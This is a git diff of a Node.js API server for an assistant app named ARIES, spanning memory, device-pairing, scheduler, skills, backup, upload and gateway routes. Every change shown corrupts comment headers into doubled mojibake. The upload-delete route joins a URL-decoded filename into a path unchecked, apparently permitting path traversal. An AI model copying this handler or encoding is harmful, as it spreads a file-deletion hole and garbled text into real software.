       return json(res, 200, { notes: pm.getRecent(days) });
     }
 
-    // â•â•â• GET /api/memory/search â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/memory/search Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/memory/search') {
       const pm = refs.persistentMemory;
       if (!pm) return json(res, 500, { error: 'Persistent memory not available' });
@@ -1949,7 +2009,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { results: pm.searchMemory(q) });
     }
 
-    // â•â•â• POST /api/memory/note â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/memory/note Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/memory/note') {
       const body = JSON.parse(await readBody(req));
       const pm = refs.persistentMemory;
@@ -1958,7 +2018,7 @@ async function handleRequest(req, res) {
       return json(res, 200, pm.addNote(body.text, body.category));
     }
 
-    // â•â•â• POST /api/memory/remember â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/memory/remember Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/memory/remember') {
       const body = JSON.parse(await readBody(req));
       const pm = refs.persistentMemory;
@@ -1967,21 +2027,21 @@ async function handleRequest(req, res) {
       return json(res, 200, pm.addMemory(body.text, body.category));
     }
 
-    // â•â•â• GET /api/memory/long-term â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/memory/long-term Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/memory/long-term') {
       const pm = refs.persistentMemory;
       if (!pm) return json(res, 500, { error: 'Persistent memory not available' });
       return json(res, 200, { content: pm.getMemory(), stats: pm.getStats() });
     }
 
-    // â•â•â• POST /api/nodes/pair â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/nodes/pair Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/nodes/pair') {
       const np = refs.nodePairing;
       if (!np) return json(res, 500, { error: 'Node pairing not available' });
       return json(res, 200, np.generatePairCode());
     }
 
-    // â•â•â• POST /api/nodes/validate â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/nodes/validate Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/nodes/validate') {
       const body = JSON.parse(await readBody(req));
       const np = refs.nodePairing;
@@ -1990,14 +2050,14 @@ async function handleRequest(req, res) {
       return json(res, 200, np.validatePair(body.code, body.deviceInfo || {}));
     }
 
-    // â•â•â• GET /api/nodes/devices â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/nodes/devices Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/nodes/devices') {
       const np = refs.nodePairing;
       if (!np) return json(res, 500, { error: 'Node pairing not available' });
       return json(res, 200, { devices: np.listDevices() });
     }
 
-    // â•â•â• POST /api/nodes/command â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/nodes/command Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/nodes/command') {
       const body = JSON.parse(await readBody(req));
       const np = refs.nodePairing;
@@ -2006,7 +2066,7 @@ async function handleRequest(req, res) {
       return json(res, 200, np.sendCommand(body.deviceId, body.type, body.payload || {}));
     }
 
-    // â•â•â• DELETE /api/nodes/device/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/nodes/device/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/nodes/device/')) {
       const id = reqPath.split('/').pop();
       const np = refs.nodePairing;
@@ -2014,7 +2074,7 @@ async function handleRequest(req, res) {
       return json(res, 200, np.removeDevice(id));
     }
 
-    // â•â•â• GET /api/nodes/poll â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/nodes/poll Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/nodes/poll') {
       const np = refs.nodePairing;
       if (!np) return json(res, 500, { error: 'Node pairing not available' });
@@ -2024,7 +2084,7 @@ async function handleRequest(req, res) {
       return json(res, 200, np.pollCommands(deviceId, token));
     }
 
-    // â•â•â• POST /api/nodes/result â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/nodes/result Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/nodes/result') {
       const body = JSON.parse(await readBody(req));
       const np = refs.nodePairing;
@@ -2032,14 +2092,14 @@ async function handleRequest(req, res) {
       return json(res, 200, np.submitResult(body.deviceId, body.token, body.commandId, body.result || {}));
     }
 
-    // â•â•â• GET /api/scheduler/jobs â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/scheduler/jobs Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/scheduler/jobs') {
       const sched = refs.scheduler;
       if (!sched) return json(res, 500, { error: 'Scheduler not available' });
       return json(res, 200, { jobs: sched.listJobs() });
     }
 
-    // â•â•â• POST /api/scheduler/job â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/scheduler/job Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/scheduler/job') {
       const body = JSON.parse(await readBody(req));
       const sched = refs.scheduler;
@@ -2052,7 +2112,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• DELETE /api/scheduler/job/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/scheduler/job/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/scheduler/job/')) {
       const id = reqPath.split('/').pop();
       const sched = refs.scheduler;
@@ -2060,7 +2120,7 @@ async function handleRequest(req, res) {
       return json(res, 200, sched.removeJob(id));
     }
 
-    // â•â•â• POST /api/scheduler/pause/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/scheduler/pause/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.startsWith('/api/scheduler/pause/')) {
       const id = reqPath.split('/').pop();
       const sched = refs.scheduler;
@@ -2068,7 +2128,7 @@ async function handleRequest(req, res) {
       return json(res, 200, sched.pauseJob(id));
     }
 
-    // â•â•â• POST /api/scheduler/resume/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/scheduler/resume/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.startsWith('/api/scheduler/resume/')) {
       const id = reqPath.split('/').pop();
       const sched = refs.scheduler;
@@ -2076,7 +2136,7 @@ async function handleRequest(req, res) {
       return json(res, 200, sched.resumeJob(id));
     }
 
-    // â•â•â• GET /api/scheduler/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/scheduler/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/scheduler/history') {
       const sched = refs.scheduler;
       if (!sched) return json(res, 500, { error: 'Scheduler not available' });
@@ -2084,7 +2144,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { history: sched.getJobHistory(jobId) });
     }
 
-    // â•â•â• POST /api/search â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/search Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/search') {
       const body = JSON.parse(await readBody(req));
       const ws = refs.webSearchEngine;
@@ -2100,7 +2160,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/search/fetch â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/search/fetch Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/search/fetch') {
       const body = JSON.parse(await readBody(req));
       const ws = refs.webSearchEngine;
@@ -2112,7 +2172,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/skills â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/skills Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/skills') {
       const sm = refs.skillManager;
       const sb = refs.skillBridge;
@@ -2122,14 +2182,14 @@ async function handleRequest(req, res) {
       return json(res, 200, { skills: installedSkills, localSkills: localSkills, commands: sm ? sm.getSkillCommands() : {} });
     }
 
-    // â•â•â• GET /api/skills/bridge/local â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/skills/bridge/local Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/skills/bridge/local') {
       var sb = refs.skillBridge;
       if (!sb) return json(res, 500, { error: 'Skill bridge not available' });
       return json(res, 200, { skills: sb.discoverLocalSkills() });
     }
 
-    // â•â•â• GET /api/skills/bridge/search â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/skills/bridge/search Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/skills/bridge/search') {
       var sb = refs.skillBridge;
       if (!sb) return json(res, 500, { error: 'Skill bridge not available' });
@@ -2138,7 +2198,7 @@ async function handleRequest(req, res) {
       catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/skills/bridge/install â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/skills/bridge/install Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/skills/bridge/install') {
       var body = JSON.parse(await readBody(req));
       var sb = refs.skillBridge;
@@ -2153,7 +2213,7 @@ async function handleRequest(req, res) {
       return json(res, 400, { error: 'Missing skillId or name' });
     }
 
-    // â•â•â• POST /api/skills/install â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/skills/install Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/skills/install') {
       const body = JSON.parse(await readBody(req));
       const sm = refs.skillManager;
@@ -2165,7 +2225,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• DELETE /api/skills/:name â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/skills/:name Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/skills/') && reqPath !== '/api/skills/install') {
       const name = decodeURIComponent(reqPath.split('/').pop());
       const sm = refs.skillManager;
@@ -2173,14 +2233,14 @@ async function handleRequest(req, res) {
       return json(res, 200, sm.uninstallSkill(name));
     }
 
-    // â•â•â• GET /api/daemon/health â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/daemon/health Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/daemon/health') {
       const d = refs.daemon;
       if (!d) return json(res, 500, { error: 'Daemon not available' });
       return json(res, 200, d.getHealth());
     }
 
-    // â•â•â• POST /api/daemon/restart â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/daemon/restart Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/daemon/restart') {
       const d = refs.daemon;
       if (!d) return json(res, 500, { error: 'Daemon not available' });
@@ -2189,11 +2249,11 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // v5.0 MODULES â€" Logger, Backup, Upload, Chat History, Docs
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // v5.0 MODULES Ã¢â‚¬" Logger, Backup, Upload, Chat History, Docs
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/logs â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/logs Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/logs') {
       var logger = refs.logger;
       if (!logger) return json(res, 200, { entries: [] });
@@ -2203,28 +2263,28 @@ async function handleRequest(req, res) {
       return json(res, 200, { entries: logger.getRecent(limit, level, mod), modules: logger.getModules() });
     }
 
-    // â•â•â• DELETE /api/logs â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/logs Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath === '/api/logs') {
       var logger2 = refs.logger;
       if (logger2) logger2.clearBuffer();
       return json(res, 200, { status: 'cleared' });
     }
 
-    // â•â•â• POST /api/backup/create â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/backup/create Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/backup/create') {
       var bk = refs.backup;
       if (!bk) return json(res, 500, { error: 'Backup not available' });
       return json(res, 200, bk.createBackup());
     }
 
-    // â•â•â• GET /api/backup/list â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/backup/list Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/backup/list') {
       var bk2 = refs.backup;
       if (!bk2) return json(res, 500, { error: 'Backup not available' });
       return json(res, 200, { backups: bk2.listBackups() });
     }
 
-    // â•â•â• POST /api/backup/restore â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/backup/restore Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/backup/restore') {
       var body = JSON.parse(await readBody(req));
       var bk3 = refs.backup;
@@ -2233,13 +2293,13 @@ async function handleRequest(req, res) {
       return json(res, 200, bk3.restoreBackup(body.filename));
     }
 
-    // â•â•â• GET /api/chat/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/chat/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/chat/history') {
       var hist = refs.persistentChatHistory || [];
       return json(res, 200, { history: hist, total: hist.length });
     }
 
-    // â•â•â• DELETE /api/chat/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/chat/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath === '/api/chat/history') {
       // Clear both history arrays
       if (refs.persistentChatHistory) refs.persistentChatHistory.length = 0;
@@ -2254,10 +2314,10 @@ async function handleRequest(req, res) {
       return json(res, 200, { status: 'cleared' });
     }
 
-    // â•â•â• GET /api/chat/export â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/chat/export Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/chat/export') {
       var chatHist = refs.persistentChatHistory || refs.getChatHistory?.() || [];
-      var md = '# ARIES Chat Export â€" ' + new Date().toISOString() + '\n\n';
+      var md = '# ARIES Chat Export Ã¢â‚¬" ' + new Date().toISOString() + '\n\n';
       for (var ci = 0; ci < chatHist.length; ci++) {
         var m = chatHist[ci];
         var role = m.role === 'user' ? 'You' : m.role === 'assistant' ? 'Aries' : 'System';
@@ -2273,14 +2333,14 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/https/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/https/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/https/status') {
       var hs = refs.httpsServer;
       if (!hs) return json(res, 200, { enabled: false });
       return json(res, 200, hs.getStatus());
     }
 
-    // â•â•â• POST /api/upload â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/upload Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/upload') {
       var contentType = req.headers['content-type'] || '';
       if (!contentType.includes('multipart/form-data')) {
@@ -2344,7 +2404,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { uploaded: uploaded, count: uploaded.length });
     }
 
-    // â•â•â• GET /api/uploads â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/uploads Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/uploads') {
       var uploadsDir = require('path').join(__dirname, '..', 'data', 'uploads');
       var files = [];
@@ -2360,7 +2420,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { files: files });
     }
 
-    // â•â•â• DELETE /api/uploads/:filename â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/uploads/:filename Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/uploads/')) {
       var fname = decodeURIComponent(reqPath.split('/').pop());
       var fpath = require('path').join(__dirname, '..', 'data', 'uploads', fname);
@@ -2369,13 +2429,13 @@ async function handleRequest(req, res) {
       catch (e) { return json(res, 404, { error: 'File not found' }); }
     }
 
-    // â•â•â• GET /api/ws/clients â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/ws/clients Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/ws/clients') {
       var wss = refs.wsServer;
       return json(res, 200, { clients: wss ? wss.getClients() : [], count: wss ? wss.clientCount : 0 });
     }
 
-    // â•â•â• GET /docs â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /docs Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (reqPath === '/docs' || reqPath === '/docs/') {
       var docsHtml = _generateDocsPage();
       res.writeHead(200, { 'Content-Type': 'text/html', 'Access-Control-Allow-Origin': '*' });
@@ -2383,32 +2443,32 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // v5.0 â€" AI Gateway, Swarm Health, Semantic Search, Advanced Scheduler/Nodes
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // v5.0 Ã¢â‚¬" AI Gateway, Swarm Health, Semantic Search, Advanced Scheduler/Nodes
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/gateway/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/gateway/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/gateway/status') {
       var gw = refs.aiGateway;
       if (!gw) return json(res, 200, { enabled: false });
       return json(res, 200, gw.getStatus());
     }
 
-    // â•â•â• GET /api/gateway/usage â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/gateway/usage Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/gateway/usage') {
       var gw2 = refs.aiGateway;
       if (!gw2) return json(res, 200, {});
       return json(res, 200, gw2.getUsage());
     }
 
-    // â•â•â• GET /api/gateway/requests â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/gateway/requests Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/gateway/requests') {
       var gw3 = refs.aiGateway;
       if (!gw3) return json(res, 200, { requests: [] });
       return json(res, 200, { requests: gw3.getRequestLog() });
     }
 
-    // â•â•â• POST /api/gateway/apikey â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/gateway/apikey Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/gateway/apikey') {
       var body = JSON.parse(await readBody(req));
       var gw4 = refs.aiGateway;
@@ -2459,14 +2519,14 @@ async function handleRequest(req, res) {
       return res.end(svg);
     }
 
-    // â•â•â• GET /api/swarm/health â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/health Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/health') {
       var sh = refs.swarmHealth;
       if (!sh) return json(res, 500, { error: 'Swarm health not available' });
       return json(res, 200, sh.getHealthReport());
     }
 
-    // â•â•â• POST /api/swarm/ping â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/ping Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm/ping') {
       var sh2 = refs.swarmHealth;
       if (!sh2) return json(res, 500, { error: 'Swarm health not available' });
@@ -2476,7 +2536,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/swarm/stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/stats') {
       var sh3 = refs.swarmHealth;
       if (!sh3) return json(res, 200, {});
@@ -2484,7 +2544,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { taskStats: report.taskStats, summary: report.summary, healthyPools: sh3.getHealthyPools() });
     }
 
-    // â•â•â• GET /api/swarm/workers â€" Enriched worker info with optimization data â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/workers Ã¢â‚¬" Enriched worker info with optimization data Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/workers') {
       try {
         var networkDeployer = require('./network-deployer');
@@ -2510,7 +2570,7 @@ async function handleRequest(req, res) {
       }
     }
 
